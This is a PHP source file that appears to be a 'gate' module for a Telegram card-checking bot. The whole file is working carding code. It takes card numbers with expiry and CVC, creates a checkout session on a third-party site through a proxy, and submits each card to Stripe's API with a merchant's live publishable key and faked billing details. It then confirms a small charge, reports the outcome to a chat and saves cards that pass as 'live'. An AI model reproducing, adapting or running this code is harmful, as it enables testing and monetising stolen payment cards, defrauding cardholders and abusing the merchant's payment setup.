<?php 

use App\Models\Bot;
use App\Gate\{Make, Responses as Res};
use App\Faker\{Name, Address, Internet};

$ccs = $ccs[0];
$cc  = $ccs['cc'];
$user['ida'] = Bot::SendMsg($user['chat_id'], "<b>Gate <u>".$gate['name']."</u> <i>started</i>♻️\nCard: <code>".implode('|', $cc)."</code>\nTime:</b> <i>".Make::Took()."'s</i>", $user['msg_id'])['result']['message_id'];

# -- REQ 1 -- #
$site1 = ['url' => 'https://www.grouphelp.top/checkout/stripe/create-checkout-session.php?n=1&u=1767091122&l=es','method' => 'GET', 'post' => null, 'headers' => ['Host: www.grouphelp.top', 'Accept: application/json'], 'cookie' => null, 'proxy' => $proxy2];
$req1 = Make::Create(1, $site1, $gate, $user);
IsUnspam($req1, $user);


$res1 = @json_decode($req1->body, true);

if (!isset($res1['id'])) {
    Res::SetParams($req1->body, $req1->body, null, null, $req1->body);
    $res = Res::Stripe3D();
    Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Parse($lang['final'], $user, implode('|', $cc), $res, $ccs['bin'], $gate['name']));
    die;
}
$merchant = $res1['id'];

# -- REQ 2 -- #
$header2 = ['Host: api.stripe.com', 'Referer: https://checkout.stripe.com/', 'Origin: https://checkout.stripe.com', 'Content-Type: application/x-www-form-urlencoded', 'Accept: */*'];
$postfield2 = 'type=card&card[number]='.$cc[0].'&card[cvc]='.$cc[3].'&card[exp_month]='.$cc[1].'&card[exp_year]='.$cc[2].'&billing_details[name]='.Name::firstName().'+'.Name::lastName().'&billing_details[email]='.urlencode(Internet::freeEmail()).'&billing_details[address][country]=US&billing_details[address][postal_code]='.Address::zip().'&guid=NA&muid=NA&sid=NA&key=pk_live_YmepYV9qq0bOrZTGPVIx3TFp&payment_user_agent=stripe.js%2F4b38fade0%3B+stripe-js-v3%2F4b38fade0%3B+checkout';
$site2 = ['url' => 'https://api.stripe.com/v1/payment_methods', 'method' => 'POST', 'post' => $postfield2, 'headers' => $header2, 'cookie' => null, 'proxy' => $proxy2];
$req2 = Make::Create(2, $site2, $gate, $user);
IsUnspam($req2, $user);

$res2 = @json_decode($req2->body, true);

if (!isset($res2['id'])) {
    Res::SetParams($req2->body, $req2->body, null, null, $req2->body);
    $res = Res::Stripe3D();
    Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Parse($lang['final'], $user, implode('|', $cc), $res, $ccs['bin'], $gate['name']));
    die;
}
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(1, implode('|', $cc), $gate['name'], $lang['wait']));
$sid = $res2['id'];

# -- REQ 3 -- #
$postfield3 = 'eid=NA&payment_method='.$sid.'&expected_amount=150&expected_payment_method_type=card&key=pk_live_YmepYV9qq0bOrZTGPVIx3TFp';
$site3 = ['url' => 'https://api.stripe.com/v1/payment_pages/'.$merchant.'/confirm', 'method' => 'POST', 'post' => $postfield3, 'headers' => $header2, 'cookie' => null, 'proxy' => $proxy2];
$req3 = Make::Create(3, $site3, $gate, $user);
IsUnspam($req3, $user);

Res::SetParams($req3->body, $req3->body, null, null, $req3->body);
$res = Res::Stripe3D(); print_r($res);

Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Parse($lang['final'], $user, implode('|', $cc), $res, $ccs['bin'], $gate['name']));

try {
    $live = Make::SaveLive($res['live'], $user['id'], implode('|', $cc), $gate['name'], $res, $ccs['bin']);
} catch (\Exception $e) {
    error_log($e->getMessage());
    echo $e->getMessage();
}